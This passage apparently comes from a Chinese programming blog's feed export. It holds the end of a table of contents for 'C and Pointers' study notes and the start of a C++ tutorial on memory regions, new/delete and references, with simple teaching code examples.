href="#16-3-1-处理器时间-lt-time-h-gt" class="headerlink" title="16.3.1 处理器时间 &lt;time.h&gt;"></a>16.3.1 处理器时间 &lt;time.h&gt;</h4><h4 id="16-3-2-当天时间"><a href="#16-3-2-当天时间" class="headerlink" title="16.3.2 当天时间"></a>16.3.2 当天时间</h4><h4 id="16-3-3-日期和时间转换"><a href="#16-3-3-日期和时间转换" class="headerlink" title="16.3.3 日期和时间转换"></a>16.3.3 日期和时间转换</h4><h3 id="16-4-非本地跳转-lt-setjmp-h-gt"><a href="#16-4-非本地跳转-lt-setjmp-h-gt" class="headerlink" title="16.4 非本地跳转 &lt;setjmp.h&gt;"></a>16.4 非本地跳转 &lt;setjmp.h&gt;</h3><h4 id="16-4-1-实例"><a href="#16-4-1-实例" class="headerlink" title="16.4.1 实例"></a>16.4.1 实例</h4><h4 id="16-4-2-何时使用非本地跳转"><a href="#16-4-2-何时使用非本地跳转" class="headerlink" title="16.4.2 何时使用非本地跳转"></a>16.4.2 何时使用非本地跳转</h4><h3 id="16-5-信号"><a href="#16-5-信号" class="headerlink" title="16.5 信号"></a>16.5 信号</h3><h4 id="16-5-1-信号名-lt-signal-h-gt"><a href="#16-5-1-信号名-lt-signal-h-gt" class="headerlink" title="16.5.1 信号名 &lt;signal.h&gt;"></a>16.5.1 信号名 &lt;signal.h&gt;</h4><h4 id="16-5-2-处理信号-lt-signal-h-gt"><a href="#16-5-2-处理信号-lt-signal-h-gt" class="headerlink" title="16.5.2 处理信号 &lt;signal.h&gt;"></a>16.5.2 处理信号 &lt;signal.h&gt;</h4><h4 id="16-5-3-信号处理函数"><a href="#16-5-3-信号处理函数" class="headerlink" title="16.5.3 信号处理函数"></a>16.5.3 信号处理函数</h4><h3 id="16-6-打印可变参数列表"><a href="#16-6-打印可变参数列表" class="headerlink" title="16.6 打印可变参数列表"></a>16.6 打印可变参数列表</h3><h3 id="16-7-执行环境"><a href="#16-7-执行环境" class="headerlink" title="16.7 执行环境"></a>16.7 执行环境</h3><h4 id="16-7-1-终止执行-lt-stdlib-h-gt"><a href="#16-7-1-终止执行-lt-stdlib-h-gt" class="headerlink" title="16.7.1 终止执行 &lt;stdlib.h&gt;"></a>16.7.1 终止执行 &lt;stdlib.h&gt;</h4><h4 id="16-7-2-断言-lt-assert-h-gt"><a href="#16-7-2-断言-lt-assert-h-gt" class="headerlink" title="16.7.2 断言 &lt;assert.h&gt;"></a>16.7.2 断言 &lt;assert.h&gt;</h4><h4 id="16-7-3-环境-lt-stdlib-h-gt"><a href="#16-7-3-环境-lt-stdlib-h-gt" class="headerlink" title="16.7.3 环境 &lt;stdlib.h&gt;"></a>16.7.3 环境 &lt;stdlib.h&gt;</h4><h4 id="16-7-4-执行系统命令-lt-stdlib-h-gt"><a href="#16-7-4-执行系统命令-lt-stdlib-h-gt" class="headerlink" title="16.7.4 执行系统命令 &lt;stdlib.h&gt;"></a>16.7.4 执行系统命令 &lt;stdlib.h&gt;</h4><h4 id="16-7-5-排序和查找-lt-stdlib-h-gt"><a href="#16-7-5-排序和查找-lt-stdlib-h-gt" class="headerlink" title="16.7.5 排序和查找 &lt;stdlib.h&gt;"></a>16.7.5 排序和查找 &lt;stdlib.h&gt;</h4><h3 id="16-8-locale"><a href="#16-8-locale" class="headerlink" title="16.8 locale"></a>16.8 locale</h3><h4 id="16-8-1-数值和货币形式-lt-local-h-gt"><a href="#16-8-1-数值和货币形式-lt-local-h-gt" class="headerlink" title="16.8.1 数值和货币形式 &lt;local.h&gt;"></a>16.8.1 数值和货币形式 &lt;local.h&gt;</h4><h4 id="16-8-2-字符串和locale-lt-string-h-gt"><a href="#16-8-2-字符串和locale-lt-string-h-gt" class="headerlink" title="16.8.2 字符串和locale &lt;string.h&gt;"></a>16.8.2 字符串和locale &lt;string.h&gt;</h4><h4 id="16-8-3-改变locale的效果"><a href="#16-8-3-改变locale的效果" class="headerlink" title="16.8.3 改变locale的效果"></a>16.8.3 改变locale的效果</h4><h3 id="16-9-总结"><a href="#16-9-总结" class="headerlink" title="16.9 总结"></a>16.9 总结</h3><h3 id="16-10-警告的总结"><a href="#16-10-警告的总结" class="headerlink" title="16.10 警告的总结"></a>16.10 警告的总结</h3><h3 id="16-11-编程提示的总结"><a href="#16-11-编程提示的总结" class="headerlink" title="16.11 编程提示的总结"></a>16.11 编程提示的总结</h3><h3 id="16-12-问题"><a href="#16-12-问题" class="headerlink" title="16.12 问题"></a>16.12 问题</h3><h3 id="16-13-编程练习"><a href="#16-13-编程练习" class="headerlink" title="16.13 编程练习"></a>16.13 编程练习</h3><h2 id="第十七章-经典抽象数据类型"><a href="#第十七章-经典抽象数据类型" class="headerlink" title="第十七章 经典抽象数据类型"></a>第十七章 经典抽象数据类型</h2><h3 id="17-1-内存分配"><a href="#17-1-内存分配" class="headerlink" title="17.1 内存分配"></a>17.1 内存分配</h3><h3 id="17-2-堆栈"><a href="#17-2-堆栈" class="headerlink" title="17.2 堆栈"></a>17.2 堆栈</h3><h4 id="17-2-1-堆栈接口"><a href="#17-2-1-堆栈接口" class="headerlink" title="17.2.1 堆栈接口"></a>17.2.1 堆栈接口</h4><h4 id="17-2-2-实现堆栈"><a href="#17-2-2-实现堆栈" class="headerlink" title="17.2.2 实现堆栈"></a>17.2.2 实现堆栈</h4><h3 id="17-3-队列"><a href="#17-3-队列" class="headerlink" title="17.3 队列"></a>17.3 队列</h3><h4 id="17-3-1-队列接口"><a href="#17-3-1-队列接口" class="headerlink" title="17.3.1 队列接口"></a>17.3.1 队列接口</h4><h4 id="17-3-2-实现队列"><a href="#17-3-2-实现队列" class="headerlink" title="17.3.2 实现队列"></a>17.3.2 实现队列</h4><h3 id="17-4-树"><a href="#17-4-树" class="headerlink" title="17.4 树"></a>17.4 树</h3><h4 id="17-4-1-在二叉搜查树中插入"><a href="#17-4-1-在二叉搜查树中插入" class="headerlink" title="17.4.1 在二叉搜查树中插入"></a>17.4.1 在二叉搜查树中插入</h4><h4 id="17-4-2-从二叉搜查树删除节点"><a href="#17-4-2-从二叉搜查树删除节点" class="headerlink" title="17.4.2 从二叉搜查树删除节点"></a>17.4.2 从二叉搜查树删除节点</h4><h4 id="17-4-3-在二叉搜查树中查找"><a href="#17-4-3-在二叉搜查树中查找" class="headerlink" title="17.4.3 在二叉搜查树中查找"></a>17.4.3 在二叉搜查树中查找</h4><h4 id="17-4-4-树的遍历"><a href="#17-4-4-树的遍历" class="headerlink" title="17.4.4 树的遍历"></a>17.4.4 树的遍历</h4><h4 id="17-4-5-二叉搜索树接口"><a href="#17-4-5-二叉搜索树接口" class="headerlink" title="17.4.5 二叉搜索树接口"></a>17.4.5 二叉搜索树接口</h4><h4 id="17-4-6-实现二叉搜索树"><a href="#17-4-6-实现二叉搜索树" class="headerlink" title="17.4.6 实现二叉搜索树"></a>17.4.6 实现二叉搜索树</h4><h3 id="17-5-实现的改进"><a href="#17-5-实现的改进" class="headerlink" title="17.5 实现的改进"></a>17.5 实现的改进</h3><h4 id="17-5-1-拥有超过一个的堆栈"><a href="#17-5-1-拥有超过一个的堆栈" class="headerlink" title="17.5.1 拥有超过一个的堆栈"></a>17.5.1 拥有超过一个的堆栈</h4><h4 id="17-5-2-拥有超过一个的类型"><a href="#17-5-2-拥有超过一个的类型" class="headerlink" title="17.5.2 拥有超过一个的类型"></a>17.5.2 拥有超过一个的类型</h4><h4 id="17-5-3-名字冲突"><a href="#17-5-3-名字冲突" class="headerlink" title="17.5.3 名字冲突"></a>17.5.3 名字冲突</h4><h4 id="17-5-4-标准函数库的ADT"><a href="#17-5-4-标准函数库的ADT" class="headerlink" title="17.5.4 标准函数库的ADT"></a>17.5.4 标准函数库的ADT</h4><h3 id="17-6-总结"><a href="#17-6-总结" class="headerlink" title="17.6 总结"></a>17.6 总结</h3><h3 id="17-7-警告的总结"><a href="#17-7-警告的总结" class="headerlink" title="17.7 警告的总结"></a>17.7 警告的总结</h3><h3 id="17-8-编程提示的总结"><a href="#17-8-编程提示的总结" class="headerlink" title="17.8 编程提示的总结"></a>17.8 编程提示的总结</h3><h3 id="17-9-问题"><a href="#17-9-问题" class="headerlink" title="17.9 问题"></a>17.9 问题</h3><h3 id="17-10-编程练习"><a href="#17-10-编程练习" class="headerlink" title="17.10 编程练习"></a>17.10 编程练习</h3><h2 id="第十八章-运行时环境"><a href="#第十八章-运行时环境" class="headerlink" title="第十八章 运行时环境"></a>第十八章 运行时环境</h2><h3 id="18-1-判断运行时环境"><a href="#18-1-判断运行时环境" class="headerlink" title="18.1 判断运行时环境"></a>18.1 判断运行时环境</h3><h4 id="18-1-1-测试程序"><a href="#18-1-1-测试程序" class="headerlink" title="18.1.1 测试程序"></a>18.1.1 测试程序</h4><h4 id="18-1-2-静态变量和初始化"><a href="#18-1-2-静态变量和初始化" class="headerlink" title="18.1.2 静态变量和初始化"></a>18.1.2 静态变量和初始化</h4><h4 id="18-1-3-堆栈帧"><a href="#18-1-3-堆栈帧" class="headerlink" title="18.1.3 堆栈帧"></a>18.1.3 堆栈帧</h4><h4 id="18-1-4-寄存器变量"><a href="#18-1-4-寄存器变量" class="headerlink" title="18.1.4 寄存器变量"></a>18.1.4 寄存器变量</h4><h4 id="18-1-5-外部标识符的长度"><a href="#18-1-5-外部标识符的长度" class="headerlink" title="18.1.5 外部标识符的长度"></a>18.1.5 外部标识符的长度</h4><h4 id="18-1-6-判断堆栈帧布局"><a href="#18-1-6-判断堆栈帧布局" class="headerlink" title="18.1.6 判断堆栈帧布局"></a>18.1.6 判断堆栈帧布局</h4><h4 id="18-1-7-表达式的副作用"><a href="#18-1-7-表达式的副作用" class="headerlink" title="18.1.7 表达式的副作用"></a>18.1.7 表达式的副作用</h4><h3 id="18-2-C和汇编语言的接口"><a href="#18-2-C和汇编语言的接口" class="headerlink" title="18.2 C和汇编语言的接口"></a>18.2 C和汇编语言的接口</h3><h3 id="18-3-运行时效率"><a href="#18-3-运行时效率" class="headerlink" title="18.3 运行时效率"></a>18.3 运行时效率</h3><h3 id="18-4-总结"><a href="#18-4-总结" class="headerlink" title="18.4 总结"></a>18.4 总结</h3><h3 id="18-5-警告的总结"><a href="#18-5-警告的总结" class="headerlink" title="18.5 警告的总结"></a>18.5 警告的总结</h3><h3 id="18-6-编程提示的总结"><a href="#18-6-编程提示的总结" class="headerlink" title="18.6 编程提示的总结"></a>18.6 编程提示的总结</h3><h3 id="18-7-问题"><a href="#18-7-问题" class="headerlink" title="18.7 问题"></a>18.7 问题</h3><h3 id="18-8-编程练习"><a href="#18-8-编程练习" class="headerlink" title="18.8 编程练习"></a>18.8 编程练习</h3><p>[^NUL]:字符串终止符（不是字符串的一部分）<br /><br>       ·是ASCII字符集中‘\0’字符的名字，字节模式为全0.<br /><br>       ·NULL在头文件stdio.h中定义，不存在预定义的符号NUL,若要使用他而不是字符常量‘\0’,就必须自行定义<br /></p>
<p>[^在其他语言中，这种叫做过程]</p>
]]></content>
      <tags>
        <tag>C与指针</tag>
      </tags>
  </entry>
  <entry>
    <title>C++核心编程</title>
    <url>/2023/04/05/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="C-核心编程"><a href="#C-核心编程" class="headerlink" title="C++核心编程"></a>C++核心编程</h1><p>本阶段主要针对C++&#x3D;&#x3D;面向对象&#x3D;&#x3D;编程技术做详细讲解，探讨C++中的核心和精髓。</p>
<span id="more"></span>
<h2 id="1-内存分区模型"><a href="#1-内存分区模型" class="headerlink" title="1 内存分区模型"></a>1 内存分区模型</h2><p>C++程序在执行时，将内存大方向划分为<strong>4个区域</strong></p>
<ul>
<li>代码区：存放函数体的二进制代码，由操作系统进行管理的</li>
<li>全局区：存放全局变量和静态变量以及常量</li>
<li>栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等</li>
<li>堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收</li>
</ul>
<p><strong>内存四区意义：</strong></p>
<p>不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程</p>
<h3 id="1-1-程序运行前"><a href="#1-1-程序运行前" class="headerlink" title="1.1 程序运行前"></a>1.1 程序运行前</h3><p>​	在程序编译后，生成了exe可执行程序，<strong>未执行该程序前</strong>分为两个区域</p>
<p>​	<strong>代码区：</strong></p>
<p>​		存放 CPU 执行的机器指令</p>
<p>​		代码区是<strong>共享</strong>的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可</p>
<p>​		代码区是<strong>只读</strong>的，使其只读的原因是防止程序意外地修改了它的指令</p>
<p>​	<strong>全局区：</strong></p>
<p>​		全局变量和静态变量存放在此.</p>
<p>​		全局区还包含了常量区, 字符串常量和其他常量也存放在此.</p>
<p>​		&#x3D;&#x3D;该区域的数据在程序结束后由操作系统释放&#x3D;&#x3D;.</p>
<!-- more -->
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="type">int</span> g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局常量</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//局部变量</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打印地址</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部变量a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部变量b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局变量g_a地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局变量g_b地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态变量</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> s_a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> s_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;静态变量s_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;静态变量s_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world1&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局常量c_g_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;全局常量c_g_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> c_l_a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> c_l_b = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部常量c_l_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;局部常量c_l_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印结果：</p>




<p>总结：</p>
<ul>
<li>C++中在程序运行前分为全局区和代码区</li>
<li>代码区特点是共享和只读</li>
<li>全局区中存放全局变量、静态变量、常量</li>
<li>常量区中存放 const修饰的全局常量  和 字符串常量</li>
</ul>
<h3 id="1-2-程序运行后"><a href="#1-2-程序运行后" class="headerlink" title="1.2 程序运行后"></a>1.2 程序运行后</h3><p>​	<strong>栈区：</strong></p>
<p>​		由编译器自动分配释放, 存放函数的参数值,局部变量等</p>
<p>​		注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> * <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>​	<strong>堆区：</strong></p>
<p>​		由程序员分配释放,若程序员不释放,程序结束时由操作系统回收</p>
<p>​		在C++中主要利用new在堆区开辟内存</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结：</strong></p>
<p>堆区数据由程序员管理开辟和释放</p>
<p>堆区数据利用new关键字进行开辟内存</p>
<h3 id="1-3-new操作符"><a href="#1-3-new操作符" class="headerlink" title="1.3 new操作符"></a>1.3 new操作符</h3><p>​	C++中利用&#x3D;&#x3D;new&#x3D;&#x3D;操作符在堆区开辟数据</p>
<p>​	堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 &#x3D;&#x3D;delete&#x3D;&#x3D;</p>
<p>​	语法：<code> new 数据类型</code></p>
<p>​	利用new创建的数据，会返回该数据对应的类型的指针</p>
<p><strong>示例1： 基本语法</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用delete释放堆区数据</span></span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; *p &lt;&lt; endl; //报错，释放的空间不可访问</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>示例2：开辟数组</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆区开辟数组</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr[i] = i + <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//释放数组 delete 后加 []</span></span><br><span class="line">	<span class="keyword">delete</span>[] arr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h2 id="2-引用"><a href="#2-引用" class="headerlink" title="2 引用"></a>2 引用</h2><h3 id="2-1-引用的基本使用"><a href="#2-1-引用的基本使用" class="headerlink" title="2.1 引用的基本使用"></a>2.1 引用的基本使用</h3><p>**作用： **给变量起别名</p>
<p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> &amp;b = a;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	b = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="2-2-引用注意事项"><a href="#2-2-引用注意事项" class="headerlink" title="2.2 引用注意事项"></a>2.2 引用注意事项</h3><ul>
<li>引用必须初始化</li>
<li>引用在初始化后，不可以改变</li>
</ul>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="comment">//int &amp;c; //错误，引用必须初始化</span></span><br><span class="line">	<span class="type">int</span> &amp;c = a; <span class="comment">//一旦初始化后，就不可以更改</span></span><br><span class="line">	c = b; <span class="comment">//这是赋值操作，不是更改引用</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h3 id="2-3-引用做函数参数"><a href="#2-3-引用做函数参数" class="headerlink" title="2.3 引用做函数参数"></a>2.3 引用做函数参数</h3><p><strong>作用：</strong>函数传参时，可以利用引用的技术让形参修饰实参</p>
<p><strong>优点：</strong>可以简化指针修改实参</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 值传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap01</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap02</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 引用传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap03</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap01</span>(a, b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap02</span>(&amp;a, &amp;b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap03</span>(a, b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p>
</blockquote>
<h3 id="2-4-引用做函数返回值"><a href="#2-4-引用做函数返回值" class="headerlink" title="2.4 引用做函数返回值"></a>2.4 引用做函数返回值</h3><p>作用：引用是可以作为函数的返回值存在的</p>
<p>注意：<strong>不要返回局部变量引用</strong></p>
<p>用法：函数调用作为左值</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回局部变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>; <span class="comment">//局部变量</span></span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回静态变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span 